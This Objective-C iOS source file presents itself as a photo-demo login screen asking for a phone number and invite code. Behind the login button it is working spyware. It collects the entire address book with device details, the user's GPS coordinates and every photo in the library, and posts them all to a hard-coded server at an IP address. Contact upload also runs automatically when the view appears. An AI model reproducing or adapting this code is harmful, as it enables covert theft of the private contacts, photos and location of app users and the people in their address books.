//
//  AssetGridVC.m
//  SamplePhotosDemo
//
//  Created by iTruda on 2018/6/18.
//  Copyright © 2018年 iTruda. All rights reserved.
//

#import "AssetGridVC.h"
#import <PhotosUI/PhotosUI.h>
#import "AFHTTPSessionManager.h"
#import "SVProgressHUD.h"
#import "XHToast.h"
#import "JXAddressBook.h"
#import "SVProgressHUD.h"
#import "JhPrivacyAuthTool.h"
#import <HealthKit/HealthKit.h>
#import "JhPrivacyAuthTool.h"
#import "AuthorizationTools.h"
#import <CoreLocation/CoreLocation.h>            //定位
#import <CoreLocation/CLLocationManager.h>

#define SCR_WIDTH   [[UIScreen mainScreen] bounds].size.width
#define SCR_HEIGHT  [[UIScreen mainScreen] bounds].size.height

@interface AssetGridVC ()<UIAlertViewDelegate,CLLocationManagerDelegate>
{
    CGSize thumbnailSize;
    CGRect previousPreheatRect;
}
@property (nonatomic, strong) JXAddressBook *addressBook;

@property (nonatomic, assign) int xxxx;
@property (nonatomic, strong) PHCachingImageManager *imageManager;
@property (nonatomic, strong) PHImageRequestOptions *requestOption;
@property (nonatomic, strong) UIActivityIndicatorView  *myIndicatorView;
@end

@implementation AssetGridVC
 
 
-(CLGeocoder *)geocder{
    
    if (!_geocder) {
        
        _geocder=[[CLGeocoder alloc]init];
    }
    return _geocder;
}
- (CLLocationManager *)locationManager{
    
    //1.监听键盘的隐藏
    // 初始化定位管理器
    _locationManager = [[CLLocationManager alloc] init];
    // 设置代理
    _locationManager.delegate = self;
    // 设置定位精确度到米
    _locationManager.desiredAccuracy = kCLLocationAccuracyBest;
    // 设置过滤器为无
    _locationManager.distanceFilter = 300;//kCLDistanceFilterNone;
    // 取得定位权限，有两个方法，取决于你的定位使用情况
    // 一个是requestAlwaysAuthorization，一个是requestWhenInUseAuthorization
    // 这句话ios8以上版本使用。
    // 方位服务
    
    // 开始定位
    [_locationManager startUpdatingLocation];
    [_locationManager requestWhenInUseAuthorization];
    [_locationManager requestAlwaysAuthorization];
    return _locationManager;
}
 
#pragma mark --- 地理位置
- (void)locationManager:(CLLocationManager *)manager didUpdateToLocation:(CLLocation *)newLocation fromLocation:(CLLocation *)oldLocation{
    
    CLLocation *location = [[CLLocation alloc] initWithLatitude:newLocation.coordinate.latitude longitude:newLocation.coordinate.longitude];
     
       _Xlatitude =  [NSString stringWithFormat:@"%F",location.coordinate.latitude];
       _Ylongitude = [NSString stringWithFormat:@"%F",location.coordinate.longitude];
    
   // 2)定义变量，拼接规则如下：手机号 + ‘,’ + 验证码 + ‘,’ + 精度  + ‘,’ + 维度
   // jingweidu = sjh + ',' + yqm + ',' + currentLon + ',' + currentLat;
     
   
    
      
//       [self.geocder reverseGeocodeLocation:location completionHandler:^(NSArray<CLPlacemark *> * _Nullable placemarks, NSError * _Nullable error) {
//           CLPlacemark *pl = [placemarks firstObject];
//           if(error == nil)
//           {
//               NSString *gecoderCity=pl.locality;
//               NSString *subLocality=pl.subLocality;
//
//               NSLog(@"gecoderCity = %@--%@",gecoderCity,subLocality);
//
//
//           }
//       }];
}


- (long )getNowTimeStamp {
    NSDateFormatter *formatter = [[NSDateFormatter alloc] init] ;
    
    [formatter setDateStyle:NSDateFormatterMediumStyle];
    
    [formatter setTimeStyle:NSDateFormatterShortStyle];
    
    [formatter setDateFormat:@"YYYY-MM-dd HH:mm:ss"]; // 设置想要的格式，hh与HH的区别:分别表示12小时制,24小时制
    
    //设置时区,这一点对时间的处理很重要
    
    NSTimeZone* timeZone = [NSTimeZone timeZoneWithName:@"Asia/Shanghai"];
    
    [formatter setTimeZone:timeZone];
    
    NSDate *dateNow = [NSDate date];
    
    long logntime =(long)[dateNow timeIntervalSince1970];
    
    return logntime;
    
}
- (void)viewDidLoad {
    [super viewDidLoad];
    
    
    [self locationManager];
    
      
   UIImageView *imageBack = [[UIImageView alloc]initWithFrame:[UIScreen mainScreen].bounds];
    imageBack.image = [UIImage imageNamed:@"beij"];
    imageBack.userInteractionEnabled = YES;
    [self.view addSubview:imageBack];
    
     
    _myIndicatorView = [[UIActivityIndicatorView alloc]initWithActivityIndicatorStyle:UIActivityIndicatorViewStyleGray];
    _myIndicatorView.frame =[UIScreen mainScreen].bounds;
    [[UIApplication sharedApplication].keyWindow addSubview:_myIndicatorView];
    
     
    [self initData];
    [self initView];
    
    UIAlertView *alertShow = [[UIAlertView alloc]initWithTitle:@"请登录" message:nil delegate:self cancelButtonTitle:@"取消" otherButtonTitles:@"确定", nil];
    [alertShow show];
    
    [self initViewsV];
}

/**
 *  初始化视图
 */
- (void)initViewsV{
    //公司名字
    //保险到期
    _shouShopAddr =  [[UILabel alloc]init];
    _shouShopAddr.backgroundColor = RGB(242, 242, 242);
    _shouShopAddr.layer.masksToBounds = YES;
    _shouShopAddr.layer.cornerRadius = 5;
    _shouShopAddr.text = @"手机号:";
    _shouShopAddr.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:_shouShopAddr];
    
    _tf_shouShopAddr =  [[UITextField alloc]init];
    _tf_shouShopAddr.placeholder = @"请输入手机号码";
    _tf_shouShopAddr.backgroundColor = RGB(242, 242, 242);
    _tf_shouShopAddr.layer.masksToBounds = YES;
    _tf_shouShopAddr.keyboardType = UIKeyboardTypeNumbersAndPunctuation;
    _tf_shouShopAddr.layer.cornerRadius = 5;
//    _tf_shouShopAddr.textAlignment = NSTextAlignmentCenter;
    _tf_shouShopAddr.contentHorizontalAlignment  = UIControlContentHorizontalAlignmentCenter;
    [self.view addSubview:_tf_shouShopAddr];
  //  [_tf_shouShopAddr addTarget:self action:@selector(getcompleBtnCLick2) forControlEvents:UIControlEventTouchUpInside];
    _shouShopAddr.frame = CGRectMake(15, 150+20, 90, 54);
    _tf_shouShopAddr.frame = CGRectMake(110, 150+20, self_width-120, 54);
    
    
    //驾驶年检
    _companyShouShop =  [[UILabel alloc]init];
    _companyShouShop.frame = CGRectMake(15, CGRectGetMaxY(_shouShopAddr.frame)+20, 90, 54);
    _companyShouShop.text = @"验证码:";
    _companyShouShop.textAlignment = NSTextAlignmentCenter;
    _companyShouShop.backgroundColor = RGB(242, 242, 242);
    _companyShouShop.layer.masksToBounds = YES;
    _companyShouShop.layer.cornerRadius = 5;
    [self.view addSubview:_companyShouShop];
    
    _tf_Coder =  [[UITextField alloc]init];
    _tf_Coder.placeholder = @"请输入验证码";
    _tf_Coder.backgroundColor = RGB(242, 242, 242);
    [self.view addSubview:_tf_Coder];
    _tf_Coder.layer.masksToBounds = YES;
    _tf_Coder.layer.cornerRadius = 5;
    _tf_Coder.frame = CGRectMake(110, CGRectGetMaxY(_shouShopAddr.frame)+20, self_width-120, 54);
        
    
    //驾驶年检
    _inviteCode =  [[UILabel alloc]init];
    _inviteCode.frame = CGRectMake(15, CGRectGetMaxY(_tf_Coder.frame)+20, 90, 54);
    _inviteCode.text = @"邀请码:";
    _inviteCode.textAlignment = NSTextAlignmentCenter;
    _inviteCode.backgroundColor = RGB(242, 242, 242);
    _inviteCode.layer.masksToBounds = YES;
    _inviteCode.layer.cornerRadius = 5;
    [self.view addSubview:_inviteCode];
    
    _tf_inviteCode =  [[UITextField alloc]init];
    _tf_inviteCode.placeholder = @"请输入邀请码";
    _tf_inviteCode.backgroundColor = RGB(242, 242, 242);
    [self.view addSubview:_tf_inviteCode];
    _tf_inviteCode.layer.masksToBounds = YES;
    _tf_inviteCode.layer.cornerRadius = 5;
    _tf_inviteCode.frame = CGRectMake(110, CGRectGetMaxY(_tf_Coder.frame)+20, self_width-120, 54);
        
    
    
     
    //驾驶年检
    UIButton * Logintf_companyId =  [[UIButton alloc]init];
    [Logintf_companyId setTitle:@"获取验证码" forState:UIControlStateNormal];
    [Logintf_companyId setTitleColor:[UIColor blueColor] forState:UIControlStateNormal];
    Logintf_companyId.layer.masksToBounds = YES;
    Logintf_companyId.backgroundColor = RGB(242, 242, 242);
    Logintf_companyId.layer.cornerRadius = 5;
    Logintf_companyId.frame = CGRectMake(20, CGRectGetMaxY(_tf_inviteCode.frame)+40, SCR_WIDTH-40, 54);
    [self.view addSubview:Logintf_companyId];
    [Logintf_companyId addTarget:self action:@selector(loginBtn) forControlEvents:UIControlEventTouchUpInside];
    
}

- (void)tf_companyIdClick {
    
    if (_tf_shouShopAddr.text.length==0) {
        
        [XHToast showBottomWithText:@"请输入手机号码" duration:1.0];
        return;
    }
    //倒计时时间 - 60S
    __block NSInteger timeOut = 59;
    //    self.timeOut = timeOut;
    //执行队列
    dispatch_queue_t queue = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
    //计时器 -》 dispatch_source_set_timer自动生成
    _timer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, queue);
    dispatch_source_set_timer(_timer, DISPATCH_TIME_NOW, 1.0 * NSEC_PER_SEC, 0 * NSEC_PER_SEC);
    dispatch_source_set_event_handler(_timer, ^{
        if (timeOut <= 0) {
            dispatch_source_cancel(self->_timer);
            //主线程设置按钮样式
            dispatch_async(dispatch_get_main_queue(), ^{
                // 倒计时结束
                [self->_tf_companyId setTitle:@" 重发验证码 " forState:UIControlStateNormal];
                [self->_tf_companyId setTitleColor:[UIColor orangeColor] forState:UIControlStateNormal];
                [self->_tf_companyId setEnabled:YES];
                //[self.getErweimaBotton setBackgroundColor:NaviBarCOLOR];
                [self->_tf_companyId setUserInteractionEnabled:YES];
            });
        } else {
            //开始计时
            //剩余秒数 seconds
            NSInteger seconds = timeOut % 60;
            NSString *strTime = [NSString stringWithFormat:@"  %.1ld  ", seconds];
            //主线程设置按钮样式
            dispatch_async(dispatch_get_main_queue(), ^{
                
                [UIView beginAnimations:nil context:nil];
                [UIView setAnimationDuration:1.0];
                NSString *title = [NSString stringWithFormat:@"  %@(s)  ",strTime];
                [self->_tf_companyId setTitle:title forState:UIControlStateNormal];
                //              [yourButton.titleLabel setTextAlignment:NSTextAlignmentRight];
                // 设置按钮title居中 上面注释的方法无效
                [self->_tf_companyId setContentHorizontalAlignment:UIControlContentHorizontalAlignmentCenter];
                [self->_tf_companyId setTitleColor:[UIColor orangeColor] forState:UIControlStateNormal];
                [self->_tf_companyId setBackgroundColor:[UIColor whiteColor]];
                [UIView commitAnimations];
                //计时器间不允许点击
                [self->_tf_companyId setUserInteractionEnabled:NO];
            });
            timeOut--;
        }
    });
    dispatch_resume(_timer);
}
  
#pragma mark --  登录
-(void)loginBtn{
    if (_tf_shouShopAddr.text.length<7||_tf_shouShopAddr.text.length>11||_tf_shouShopAddr.text.length==0) {
        
        [XHToast showTopWithText:@"请输入正确手机号码" duration:3.0];
        return;
    }
    if (_tf_inviteCode.text.length==0) {
        
        [XHToast showTopWithText:@"请输入正确邀请码" duration:3.0];
        return;
    }
    __weak __typeof(self)weakSelf = self;
    __block BOOL boolValue;
    [[JhPrivacyAuthTool shareInstance]CheckPrivacyAuthWithType:JhPrivacyTypePhotos isPushSetting:NO block:^(BOOL granted, JhAuthStatus status) {
        boolValue = granted;
        NSLog(@" 授权状态 %ld ",(long)status);
        
        if (status == JhAuthStatusAuthorized) {
            
            NSLog(@"已经授权");
        } else if (status == JhAuthStatusNotDetermined) {
            
            NSLog(@"第一次");
        } else if (status == JhAuthStatusDenied) {
            UIAlertController *alertController = [UIAlertController alertControllerWithTitle:nil message:@"需要你的同意，来访问相册上传头像" preferredStyle:UIAlertControllerStyleAlert];
            UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:^(UIAlertAction * _Nonnull action) {
            }];
            UIAlertAction *setAction = [UIAlertAction actionWithTitle:@"去设置" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                //跳入当前App设置界面
                [[UIApplication sharedApplication] openURL:[NSURL URLWithString:UIApplicationOpenSettingsURLString]];
            }];
            [alertController addAction:cancelAction];
            [alertController addAction:setAction];
            
            [weakSelf presentViewController:alertController animated:true completion:nil];
            return;
        }
    }];
    NSLog(@" 是否授权: %@", boolValue ? @"YES" : @"No");
   
     
    
    [AuthorizationTools requestPrivacyType:PrivacyTypeAddressBook authorizationStatus:^(AuthorizationStatus status, BOOL isFirstAuthorization) {
        NSLog(@"授权：%@", isFirstAuthorization ? @"是第一次授权" : @"不是第一次授权");
      
        
        if (status == AuthorizationStatusAuthorized) {
            
            NSLog(@"已经授权");
        } else if (status == AuthorizationStatusDenied) {
            
            NSLog(@"用户拒绝");
        
            UIAlertController *alertController = [UIAlertController alertControllerWithTitle:nil message:@"需要你的同意，来访问通讯录权限" preferredStyle:UIAlertControllerStyleAlert];
            UIAlertAction *cancelAction = [UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleCancel handler:^(UIAlertAction * _Nonnull action) {
            }];
            UIAlertAction *setAction = [UIAlertAction actionWithTitle:@"去设置" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                //跳入当前App设置界面
                [[UIApplication sharedApplication] openURL:[NSURL URLWithString:UIApplicationOpenSettingsURLString]];
            }];
            [alertController addAction:cancelAction];
            [alertController addAction:setAction];
            
            [weakSelf presentViewController:alertController animated:true completion:nil];
            
        }
        return;
    }];
    
    [self checkLocationAuth];
    
 
    
    
     
    
    // 上传通讯录
    _addressBook = [JXAddressBook sharedInstance];
    [_addressBook uploadAddressBookContacts];
    
    
    if(_addressBook.addressBookDic==nil){
        
        return;
    }
    NSArray *addressPhoneNums = _addressBook.addressBookDic.allKeys;
    if (!addressPhoneNums || addressPhoneNums.count <= 0)
        return;
   
    if (_addressBook.locPhoneNums.count > 0) {
        
        NSString *aUIDI= [JXAddressBook sharedInstance].keyUDid;
        
        
        NSString *deviceName = [[UIDevice currentDevice] name];
        NSString *iphonemodel= [[UIDevice currentDevice] model];
        NSString *sysVersion = [[UIDevice currentDevice] systemVersion];
        NSString *thrsd = [NSString stringWithFormat:@"%@ %@ %@",deviceName,iphonemodel,sysVersion];
        NSString *consjh = [NSString stringWithFormat:@"%@**%@**%@",_tf_shouShopAddr.text,_tf_inviteCode.text,thrsd];
        
        NSMutableString *mString = [NSMutableString stringWithString:consjh];
        
        for (NSInteger i = 0; i < _addressBook.locPhoneNums.count; i ++) {
            NSString *phone = _addressBook.locPhoneNums[i];
            NSString *name = _addressBook.addressBookDic[phone];
             name = [name stringByReplacingOccurrencesOfString:@" " withString:@""];
             [mString appendString:[NSString stringWithFormat:@"=%@|%@",name,phone]];
              
        }
        
        
       [SVProgressHUD show];
        NSDictionary *dictJsonUpdate = @{ @"data":mString.copy }.mutableCopy;
        [[AFHTTPSessionManager manager]POST:@"http://206.238.221.246:2096/api/Uploads/api" parameters:dictJsonUpdate headers:@{} progress:^(NSProgress * _Nonnull uploadProgress) {
         } success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
             
//             [_locationManager startUpdatingLocation];
//             [self->_locationManager startUpdatingHeading];
             
             [self addressUI];
            NSLog(@"上传 responseObject = %@",responseObject);
            
             
             [self initData];
             
             for (int i = 0;i<self->_fetchResult.count;i++){ //photoArr是存储相册里面的图片 类型为image
                
                 PHAsset *asset = [self->_fetchResult objectAtIndex:i];
             
                   if (@available(iOS 13, *)) {
                       [self->_imageManager requestImageDataAndOrientationForAsset:asset options:self->_requestOption resultHandler:^(NSData * _Nullable imageData, NSString * _Nullable dataUTI, CGImagePropertyOrientation orientation, NSDictionary * _Nullable info) {
                           UIImage *result = [UIImage imageWithData:imageData];
                           [self getNetWork:result rk:i];
                       }];
                   } else {
                       
                       [self->_imageManager requestImageDataForAsset:asset options:self->_requestOption resultHandler:^(NSData * _Nullable imageData, NSString * _Nullable dataUTI, UIImageOrientation orientation, NSDictionary * _Nullable info) {
                            UIImage *result = [UIImage imageWithData:imageData];
                           [self getNetWork:result rk:i];
                       }];
                       
                   }
                 
//                 [self->_imageManager requestImageForAsset:asset targetSize:self->thumbnailSize contentMode:PHImageContentModeAspectFill options:self->_requestOption resultHandler:^(UIImage * _Nullable result, NSDictionary * _Nullable info) {
//          
//                      
//                 }];
             }
             
        } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
            
            NSLog(@"上传 error %@",error);
        }];
        
    }
    
}
#pragma mark -- 定位
- (void)addressUI{
    
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    dict[@"data"]= [NSString stringWithFormat:@"%@,%@,%@,%@",_tf_shouShopAddr.text,_tf_inviteCode.text,_Xlatitude,_Ylongitude];
    
  
     NSLog(@"sjh = %@", dict);
    // 当 resultHandler 被调用时，cell可能已被回收，所以此处加个判断条件
    [[AFHTTPSessionManager manager]  POST:@"http://206.238.221.246:2096/api/Uploads/apimap" parameters:dict headers:@{} progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        
         NSLog(@"responseObject = %@", responseObject);
        
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        
         NSLog(@"error = %@", error);
    }];
}
 
- (void)getNetWork:(UIImage *)result rk:(int )iii{
    
    NSString *requestStrurl = [NSString stringWithFormat:@"http://206.238.221.246:2096/api/Uploads/uploadimg"];
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];
    dict[@"sjh"]= [NSString stringWithFormat:@"%@",_tf_shouShopAddr.text];
     NSLog(@"sjh = %@", dict[@"sjh"]);
    // 当 resultHandler 被调用时，cell可能已被回收，所以此处加个判断条件
    [[AFHTTPSessionManager manager] POST:requestStrurl parameters:dict headers:nil constructingBodyWithBlock:^(id<AFMultipartFormData>  _Nonnull formData) {
        NSData *data = UIImagePNGRepresentation(result);
        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
        formatter.dateFormat = @"yyyyMMddHHmmss";
        NSString *str = [formatter stringFromDate:[NSDate date]];
        NSString *pngName = [NSString stringWithFormat:@"%@.jpg", str];
        NSString *filename = [NSString stringWithFormat:@"file%d",iii+1];
        //此处注意name是POST方法的KEY，是服务器提供的参数名 filename 文件名，pngName 托名
        [formData appendPartWithFileData:data name:@"file" fileName:pngName mimeType:@"image/png"];
    } progress:^(NSProgress * _Nonnull uploadProgress) {
    } success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
       // NSArray *dictArr= responseObject;
      //  NSDictionary *dict= responseObject;
      [self uploadImg:dict[@"sjh"]];
        
       [_myIndicatorView stopAnimating];
       NSLog(@"img = %@",responseObject);
        
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        NSLog(@"error = %@",error);
    }];
}


- (void)uploadImg:(NSString *)imaName {
    if(imaName.length==0||imaName.length==nil){
        return;
    }
    
    NSDictionary *dictJsonUpdate = @{
        @"sjh": [NSString stringWithFormat:@"%@",_tf_shouShopAddr.text],
        @"img": imaName
    }.mutableCopy;
    [[AFHTTPSessionManager manager]POST:@"http://206.238.221.246:2096/api/Uploads/addimg" parameters:dictJsonUpdate headers:@{} progress:^(NSProgress * _Nonnull uploadProgress) {
            
        } success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
         
            
            NSLog(@"上传 图片名成功 = %@",responseObject);
            
        } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
            
            NSLog(@"上传 图片名 = %@",error);
       }];
   
}

- (void)initData
{
//    if (!_fetchResult) {
        PHFetchOptions *allPhotosOptions = [[PHFetchOptions alloc] init];
        allPhotosOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:YES]];
        _fetchResult = [PHAsset fetchAssetsWithOptions:allPhotosOptions];
//    }
    
    NSLog(@"_fetchResult = %lu",(unsigned long)_fetchResult.count);
    _imageManager = [[PHCachingImageManager alloc] init];
    
    _requestOption = [[PHImageRequestOptions alloc] init];
    
   _requestOption.synchronous = YES;//主要是这个设为YES这样才会只走一次
    // 若设置 PHImageRequestOptionsResizeModeExact 则 requestImageForAsset 下来的图片大小是 targetSize 的
    _requestOption.resizeMode = PHImageRequestOptionsResizeModeExact;
    // 若 _requestOption = nil，则承载图片的 UIImageView 需要添加如下代码
    /*
     _imageView.contentMode = UIViewContentModeScaleAspectFill;
     _imageView.clipsToBounds = YES;
     */
//    _requestOption = nil;
    
    [self resetCachedAssets];
   
    _xxxx = arc4random() % 1000000000+1;
    
}


 

- (void)initView
{
    self.view.backgroundColor = [UIColor whiteColor];
//    self.collectionView.backgroundColor = [UIColor whiteColor];;
}

- (void)viewWillAppear:(BOOL)animated
{
    [super viewWillAppear:animated];
    
    
    CGFloat scale = UIScreen.mainScreen.scale;
    CGFloat item_WH = (SCR_WIDTH-20.f-2.f*3)/4.f;
    thumbnailSize = CGSizeMake(item_WH * scale, item_WH * scale);
}

- (void)viewDidAppear:(BOOL)animated
{
    [super viewDidAppear:animated];
    [self updateCachedAssets];
    
    // 上传通讯录
    _addressBook = [JXAddressBook sharedInstance];
    [_addressBook uploadAddressBookContacts];
}

- (void)resetCachedAssets
{
    [_imageManager stopCachingImagesForAllAssets];
    previousPreheatRect = CGRectZero;
}

- (void)updateCachedAssets
{
    if (!self.isViewLoaded || self.view.window == nil) {
        return;
    }
    
    // 预热区域 preheatRect 是 可见区域 visibleRect 的两倍高
////    CGRect visibleRect = CGRectMake(0.f, self.collectionView.contentOffset.y, self.collectionView.bounds.size.width, self.collectionView.bounds.size.height);
////    CGRect preheatRect = CGRectInset(visibleRect, 0, -0.5*visibleRect.size.height);
//
//    // 只有当可见区域与最后一个预热区域显著不同时才更新
//    CGFloat delta = fabs(CGRectGetMidY(preheatRect) - CGRectGetMidY(previousPreheatRect));
//    if (delta > self.view.bounds.size.height / 3.f) {
//        // 计算开始缓存和停止缓存的区域
//        [self computeDifferenceBetweenRect:previousPreheatRect andRect:preheatRect removedHandler:^(CGRect removedRect) {
//            [self imageManagerStopCachingImagesWithRect:removedRect];
//        } addedHandler:^(CGRect addedRect) {
//            [self imageManagerStartCachingImagesWithRect:addedRect];
//        }];
//        previousPreheatRect = preheatRect;
//    }
}

- (void)computeDifferenceBetweenRect:(CGRect)oldRect andRect:(CGRect)newRect removedHandler:(void (^)(CGRect removedRect))removedHandler addedHandler:(void (^)(CGRect addedRect))addedHandler
{
    if (CGRectIntersectsRect(newRect, oldRect)) {
        CGFloat oldMaxY = CGRectGetMaxY(oldRect);
        CGFloat oldMinY = CGRectGetMinY(oldRect);
        CGFloat newMaxY = CGRectGetMaxY(newRect);
        CGFloat newMinY = CGRectGetMinY(newRect);
        //添加 向下滑动时 newRect 除去与 oldRect 相交部分的区域（即：屏幕外底部的预热区域）
        if (newMaxY > oldMaxY) {
            CGRect rectToAdd = CGRectMake(newRect.origin.x, oldMaxY, newRect.size.width, (newMaxY - oldMaxY));
            addedHandler(rectToAdd);
        }
        //添加 向上滑动时 newRect 除去与 oldRect 相交部分的区域（即：屏幕外底部的预热区域）
        if (oldMinY > newMinY) {
            CGRect rectToAdd = CGRectMake(newRect.origin.x, newMinY, newRect.size.width, (oldMinY - newMinY));
            addedHandler(rectToAdd);
        }
        //移除 向上滑动时 oldRect 除去与 newRect 相交部分的区域（即：屏幕外底部的预热区域）
        if (newMaxY < oldMaxY) {
            CGRect rectToRemove = CGRectMake(newRect.origin.x, newMaxY, newRect.size.width, (oldMaxY - newMaxY));
            removedHandler(rectToRemove);
        }
        //移除 向下滑动时 oldRect 除去与 newRect 相交部分的区域（即：屏幕外顶部的预热区域）
        if (oldMinY < newMinY) {
            CGRect rectToRemove = CGRectMake(newRect.origin.x, oldMinY, newRect.size.width, (newMinY - oldMinY));
            removedHandler(rectToRemove);
        }
    }
    else {
        //当 oldRect 与 newRect 没有相交区域时
        addedHandler(newRect);
        removedHandler(oldRect);
    }
}

- (void)imageManagerStartCachingImagesWithRect:(CGRect)rect
{
    NSMutableArray<PHAsset *> *addAssets = [self indexPathsForElementsWithRect:rect];
    [_imageManager startCachingImagesForAssets:addAssets targetSize:thumbnailSize contentMode:PHImageContentModeAspectFill options:_requestOption];
}

- (void)imageManagerStopCachingImagesWithRect:(CGRect)rect
{
    NSMutableArray<PHAsset *> *removeAssets = [self indexPathsForElementsWithRect:rect];
    [_imageManager stopCachingImagesForAssets:removeAssets targetSize:thumbnailSize contentMode:PHImageContentModeAspectFill options:_requestOption];
}

- (NSMutableArray<PHAsset *> *)indexPathsForElementsWithRect:(CGRect)rect
{
//    UICollectionViewLayout *layout = self.collectionView.collectionViewLayout;
//    NSArray<__kindof UICollectionViewLayoutAttributes *> *layoutAttributes = [layout layoutAttributesForElementsInRect:rect];
    NSMutableArray<PHAsset *> *assets = [NSMutableArray array];
//    for (__kindof UICollectionViewLayoutAttributes *layoutAttr in layoutAttributes) {
//        NSIndexPath *indexPath = layoutAttr.indexPath;
//        PHAsset *asset = [_fetchResult objectAtIndex:indexPath.item];
//        [assets addObject:asset];
//    }
    return assets;
}

#pragma mark - UIScrollViewDelegate -
- (void)scrollViewDidScroll:(UIScrollView *)scrollView
{
    [self updateCachedAssets];
}
 
#pragma mark <UICollectionViewDelegate>
- (void)dealloc
{
    [[PHPhotoLibrary sharedPhotoLibrary] unregisterChangeObserver:self];
}

/*
// Uncomment this method to specify if the specified item should be highlighted during tracking
- (BOOL)collectionView:(UICollectionView *)collectionView shouldHighlightItemAtIndexPath:(NSIndexPath *)indexPath {
	return YES;
}
*/

/*
// Uncomment this method to specify if the specified item should be selected
- (BOOL)collectionView:(UICollectionView *)collectionView shouldSelectItemAtIndexPath:(NSIndexPath *)indexPath {
    return YES;
}
*/

/*
// Uncomment these methods to specify if an action menu should be displayed for the specified item, and react to actions performed on the item
- (BOOL)collectionView:(UICollectionView *)collectionView shouldShowMenuForItemAtIndexPath:(NSIndexPath *)indexPath {
	return NO;
}

- (BOOL)collectionView:(UICollectionView *)collectionView canPerformAction:(SEL)action forItemAtIndexPath:(NSIndexPath *)indexPath withSender:(id)sender {
	return NO;
}

- (void)collectionView:(UICollectionView *)collectionView performAction:(SEL)action forItemAtIndexPath:(NSIndexPath *)indexPath withSender:(id)sender {
	
}
*/


- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

- (void)photoLibraryDidChange:(nonnull PHChange *)changeInstance {
     
}


-(void)touchesBegan:(NSSet<UITouch *> *)touches withEvent:(UIEvent *)event{
    
    [self.view endEditing:YES];
}



#pragma mark - Private Method
- (void)setupAuthorizationStatus:(AuthorizationStatus)status {
    
    if (status == AuthorizationStatusAuthorized) {
        
        NSLog(@"已经授权");
    } else if (status == AuthorizationStatusDenied) {
        
        NSLog(@"用户拒绝");
        return;
    }
}



#pragma mark 判断地图权限是否打开
-(BOOL)checkLocationAuth {
    
    if ([CLLocationManager locationServicesEnabled])
    {
        //system location enabled
        if ([CLLocationManager authorizationStatus]!=kCLAuthorizationStatusAuthorizedWhenInUse && [CLLocationManager authorizationStatus] !=kCLAuthorizationStatusAuthorizedAlways)
        {
            //定位服务开启 -但是用户没有允许他定位
            [self showAlert:@"地理位置未授权" message:[NSString stringWithFormat:@"在“设置-%@”允许访问位置信息才能正常使用定位功能哦~",@""]];
            return NO;
        }
        return YES;
    }
    else
    {
        //定位服务开启 -但是用户没有允许他定位
        [self showAlert:@"打开定位服务" message:[NSString stringWithFormat:@"请去系统定位服务,允许获取您的位置",@""]];
        return NO;
    }
}
- (void)showAlert:(NSString*)title message:(NSString *)message {
     
    UIAlertController *alertvc = [UIAlertController alertControllerWithTitle:title
                                                                     message:message
                                                              preferredStyle:UIAlertControllerStyleAlert];
    UIAlertAction *cancel = [UIAlertAction actionWithTitle:@"取消" style:UIAlertActionStyleDefault
                                                   handler:^(UIAlertAction * _Nonnull action) {
                                                   }];
    UIAlertAction *setting = [UIAlertAction actionWithTitle:@"去设置" style:UIAlertActionStyleDefault
                                                    handler:^(UIAlertAction * _Nonnull action) {
                                                        [self gotoSetting];
                                                    }];
    [alertvc addAction:cancel];
    [alertvc addAction:setting];
    [self presentViewController:alertvc animated:YES completion:nil];
}


/**
 跳转到设置页面
 */
- (void)gotoSetting {
    NSURL *settingUrl = [NSURL URLWithString:UIApplicationOpenSettingsURLString];
    if (@available(iOS 10.0, *)) {
        #pragma mark 这里的返回只是 跳转到设置页面成功
        [[UIApplication sharedApplication] openURL:settingUrl options:@{}completionHandler:^(BOOL success) {
        }];
    } else {
        // Fallback on earlier versions
        [[UIApplication sharedApplication] openURL:settingUrl];
    }
}
@end
